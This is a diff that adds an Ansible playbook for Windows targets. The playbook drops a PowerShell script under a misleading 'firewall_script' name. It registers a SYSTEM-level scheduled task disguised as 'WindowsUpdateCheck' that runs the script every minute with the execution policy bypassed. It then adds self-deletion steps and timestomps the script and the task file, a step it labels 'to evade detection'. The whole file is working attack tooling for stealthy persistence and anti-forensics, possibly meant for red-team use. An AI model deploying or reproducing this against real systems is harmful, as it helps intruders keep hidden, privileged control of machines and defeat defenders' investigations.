@@ -1,0 +1,46 @@
+---
+- name: Copy PowerShell script to target
+  win_copy:
+    src: "files/doubletap.ps1"
+    dest: "C:\\Windows\\Temp\\firewall_script.ps1"
+
+- name: Create Scheduled Task to Run Script Every Minute
+  win_shell: |
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Windows\Temp\firewall_script.ps1"
+    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
+    Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $Action -Trigger $Trigger -User "SYSTEM" -RunLevel Highest -Force
+  args:
+    executable: powershell.exe
+
+- name: Modify PowerShell script to self-delete task after execution
+  win_lineinfile:
+    path: "C:\\Windows\\Temp\\firewall_script.ps1"
+    line: 'Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -Confirm:$false'
+    insertafter: "# Cleanup after explosion"
+
+- name: Add script deletion at the end of the PowerShell script
+  win_lineinfile:
+    path: "C:\\Windows\\Temp\\firewall_script.ps1"
+    line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
+    insertafter: 'Log " My work here is done"''
+
+- name: Timestomp script and task to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\Windows\System32\cmd.exe").CreationTime
+    (Get-Item "C:\Windows\Temp\firewall_script.ps1").CreationTime = $time
+    (Get-Item "C:\Windows\Temp\firewall_script.ps1").LastWriteTime = $time
+    (Get-Item "C:\Windows\Temp\firewall_script.ps1").LastAccessTime = $time
+  args:
+    executable: powershell.exe
+
+- name: Timestomp Scheduled Task XML
+  win_shell: |
+    $taskPath = "C:\Windows\System32\Tasks\WindowsUpdateCheck"
+    if (Test-Path $taskPath) {
+        $time = (Get-Item "C:\Windows\System32\cmd.exe").CreationTime
+        (Get-Item $taskPath).CreationTime = $time
+        (Get-Item $taskPath).LastWriteTime = $time
+        (Get-Item $taskPath).LastAccessTime = $time
+    }
+  args:
+    executable: powershell.exe
